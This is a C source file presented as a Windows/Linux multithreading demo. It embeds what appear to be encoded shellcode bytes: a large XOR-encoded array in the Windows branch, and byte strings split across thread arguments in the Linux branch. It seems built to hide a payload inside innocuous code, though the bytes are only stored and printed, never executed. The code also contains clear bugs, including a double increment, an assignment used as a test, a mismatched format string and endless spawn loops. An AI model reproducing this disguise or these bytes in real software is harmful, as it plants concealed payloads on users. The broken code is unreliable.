#include<stdio.h>
#include<stdlib.h>
#include<pthread.h>


#define MAXTHREAD 512
#define BUFSIZE 255


#ifdef _WIN32
#include<windows.h>
#include<tchar.h>
#include<strsafe.h>

DWORD WINAPI win_thread_func(LPVOID lpParam);
void ErrorHandler(int lpszFunc);
typedef struct Data{
	char val1;
	char val2;
} Data, *pData;
unsigned char buf[] = 	"\x48\x31\xc9\x48\x81\xe9\xdc\xff\xff\xff\x48\x8d\x05\xef\xff"
			"\xff\xff\x48\xbb\xe1\x36\x5a\xb3\x5f\xc3\xce\x73\x48\x31\x58"
			"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x1d\x7e\xd9\x57\xaf\x2b"
			"\x0e\x73\xe1\x36\x1b\xe2\x1e\x93\x9c\x22\xb7\x7e\x6b\x61\x3a"
			"\x8b\x45\x21\x81\x7e\xd1\xe1\x47\x8b\x45\x21\xc1\x7e\xd1\xc1"
			"\x0f\x8b\xc1\xc4\xab\x7c\x17\x82\x96\x8b\xff\xb3\x4d\x0a\x3b"
			"\xcf\x5d\xef\xee\x32\x20\xff\x57\xf2\x5e\x02\x2c\x9e\xb3\x77"
			"\x0b\xfb\xd4\x91\xee\xf8\xa3\x0a\x12\xb2\x8f\x48\x4e\xfb\xe1"
			"\x36\x5a\xfb\xda\x03\xba\x14\xa9\x37\x8a\xe3\xd4\x8b\xd6\x37"
			"\x6a\x76\x7a\xfa\x5e\x13\x2d\x25\xa9\xc9\x93\xf2\xd4\xf7\x46"
			"\x3b\xe0\xe0\x17\x82\x96\x8b\xff\xb3\x4d\x77\x9b\x7a\x52\x82"
			"\xcf\xb2\xd9\xd6\x2f\x42\x13\xc0\x82\x57\xe9\x73\x63\x62\x2a"
			"\x1b\x96\x37\x6a\x76\x7e\xfa\x5e\x13\xa8\x32\x6a\x3a\x12\xf7"
			"\xd4\x83\xd2\x3a\xe0\xe6\x1b\x38\x5b\x4b\x86\x72\x31\x77\x02"
			"\xf2\x07\x9d\x97\x29\xa0\x6e\x1b\xea\x1e\x99\x86\xf0\x0d\x16"
			"\x1b\xe1\xa0\x23\x96\x32\xb8\x6c\x12\x38\x4d\x2a\x99\x8c\x1e"
			"\xc9\x07\xfb\xe5\xc2\xce\x73\xe1\x36\x5a\xb3\x5f\x8b\x43\xfe"
			"\xe0\x37\x5a\xb3\x1e\x79\xff\xf8\x8e\xb1\xa5\x66\xe4\x33\x7b"
			"\xd1\xb7\x77\xe0\x15\xca\x7e\x53\x8c\x34\x7e\xd9\x77\x77\xff"
			"\xc8\x0f\xeb\xb6\xa1\x53\x2a\xc6\x75\x34\xf2\x44\x35\xd9\x5f"
			"\x9a\x8f\xfa\x3b\xc9\x8f\xc3\x30\xb4\xab\x01\x92\x5e\x3f\xdf"
			"\x33\xed\xab\x0b\x84\x36\x5a\xb3\x5f\xc3\xce\x73";
#endif

#ifdef __linux__
#include<sys/socket.h>
void *print_msg_func(void *ptr);
pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;
int i = 0;
#endif


int main(){

	#ifdef __linux__

	do{
		
		for(i=0; i++ < MAXTHREAD-5; i++){

			pthread_t thread[MAXTHREAD];
			char *str = "\xEB\x27\x5B\x53\x5F\xB0\x82\xFC\xAE\x75\xFD\x57\x59\x53\x5E\x8A\x06";
			char *str2 = "\x30\x07\x48\xFF\xC7\x48\xFF\xC6\x66\x81\x3F\x35\x98\x74\x07\x80";
			char *str3 = "\x3E\x82\x75\xEA\xEB\xE6\xFF\xE1\xE8\xD4\xFF\xFF\xFF\x01\x82\x6B";
			char *str4 = "\x63\x68\x6F\x2E\x72\x69\x01\x57\x56\x49\x88\xE7\x0E\x04\x35\x98";
			char *str5 = "\x3A\x59\x98\x49\xBA\x2E\x63\x68\x6F\x2E\x72\x69\x01\x52\x49\x88";
			char *str6 = "\xE6\x69\x2C\x62\x01\x01\x49\x88\xE7\x53\xE9\x09\x01\x01\x01\x2E";

			int t1, t2, t3, t4, t5, t6;
			t1 = pthread_create(&thread[i], NULL, print_msg_func, (void*) str);
			t2 = pthread_create(&thread[i+1], NULL, print_msg_func, (void*) str2);
			t3 = pthread_create(&thread[i+2], NULL, print_msg_func, (void*) str3);
			t4 = pthread_create(&thread[i+3], NULL, print_msg_func, (void*) str4);
			t5 = pthread_create(&thread[i+4], NULL, print_msg_func, (void*) str5);
			t6 = pthread_create(&thread[i+5], NULL, print_msg_func, (void*) str6);

			pthread_join(thread[i], NULL);
			pthread_join(thread[i+1], NULL);
			pthread_join(thread[i+2], NULL);
			pthread_join(thread[i+3], NULL);
			pthread_join(thread[i+4], NULL);
			pthread_join(thread[i+5], NULL);
			
			

		}

	} while(1);
	#endif

	#ifdef _WIN32
	do{
		pData pDataArray[MAXTHREAD];
		DWORD dwThreadIdArray[MAXTHREAD];
		HANDLE hThreadArray[MAXTHREAD];

		for(int i=0; i<MAXTHREAD; i++){
			pDataArray[i] = (pData) HeapAlloc(GetProcessHeap(),
							HEAP_ZERO_MEMORY,
							sizeof(Data));
			if(pDataArray[i] == NULL){
				ExitProcess(2);
			}
			pDataArray[i]->val1 = i;
			pDataArray[i]->val2 = i+100;
			hThreadArray[i] = CreateThread(NULL,
							0,
							win_thread_func,
							pDataArray[i],
							0,
							&dwThreadIdArray[i]);
			if(hThreadArray[i] = NULL){
				ErrorHandler(1);
				ExitProcess(3);
			}
			
		}
		WaitForMultipleObjects(MAXTHREAD, hThreadArray, TRUE, INFINITE);
		for(int i=0; i<MAXTHREAD; i++){
			CloseHandle(hThreadArray[i]);
			if(pDataArray[i] != NULL){
				HeapFree(GetProcessHeap(), 0, pDataArray[i]);
				pDataArray[i] = NULL;
			}
		}
		return 0;

	}while(1);
	#endif

}

#ifdef __linux__
void *print_msg_func(void *ptr){

	char *msg;
	msg = (char *) ptr;
	return msg;

}
#endif

#ifdef _WIN32
DWORD WINAPI win_thread_func(LPVOID lpParam){
	HANDLE hStdOut;
	pData pDataArray;
	TCHAR msgBuf[BUFSIZE];
	size_t cchStringSize;
	DWORD dwChars;

	hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	if(hStdOut == INVALID_HANDLE_VALUE){
			return 1;
	}
	pDataArray = (pData)lpParam;
	StringCchPrintf(msgBuf, BUFSIZE, TEXT("%s\n"), pDataArray->val1, pDataArray->val2);
	StringCchLength(msgBuf, BUFSIZE, &cchStringSize);
	WriteConsole(hStdOut, msgBuf, (DWORD)cchStringSize, &dwChars, NULL);

	return 0;
}

void ErrorHandler(int lpszFunc){
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,(lstrlen((LPCTSTR) lpMsgBuf) + lstrlen((LPCTSTR) lpszFunc) +40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR) lpDisplayBuf,
			LocalSize(lpDisplayBuf) / sizeof(TCHAR),
			TEXT("%s\n"), 
			buf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);
	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}
#endif
